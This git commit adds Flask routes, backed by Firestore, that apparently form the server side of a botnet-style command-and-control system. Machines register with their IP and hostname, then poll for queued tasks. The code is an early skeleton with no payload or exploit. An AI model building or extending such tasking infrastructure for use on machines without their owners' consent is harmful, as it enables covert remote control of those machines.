ff4422909028ab27df1809854464ca2e67f4f913
NateM135 <melwaninate@gmail.com>
2022-04-02 11:28:57 -0700

    moved routes from app -> client_api.py

---
+++ backend/routes/client_api.py
@@ -0,0 +1,46 @@
+from flask import Flask, request, Blueprint
+import firebase_admin
+from firebase_admin import credentials, firestore
+import uuid
+from . import routes
+
+client_api = Blueprint('client_api', __name__)
+
+#Firestore/Firebase Stuff
+cred = credentials.Certificate("serviceAccountKey.json")
+firebase_admin.initialize_app(cred)
+db = firestore.client()
+
+
+@routes.route('/bot/register/<string:hostname>', methods=['POST'])
+def index(hostname):
+    id = str(uuid.uuid4())
+
+    db.collection('machines').add({
+        'uuid': id,
+        'ip': request.remote_addr,
+        'hostname': hostname,
+        'poll_rate': 5,
+        'tasks': [],
+    })
+
+    return {'uuid': id}
+
+
+@routes.route('/bot/poll', methods=['GET'])
+def poll():
+    machine = db.collection('machines').where(
+        'uuid', '==', request.headers.get('uuid')).limit(1).get()
+
+    if not machine:
+        return {'Error': 'No machines found'}
+
+    if machine[0].to_dict()['tasks']:
+        return {'task': machine[0].to_dict()['tasks'][0]}
+
+    return ('', 418)
+
+
+@routes.route('/bot/out')
+def out():
+    return 'aaaa'
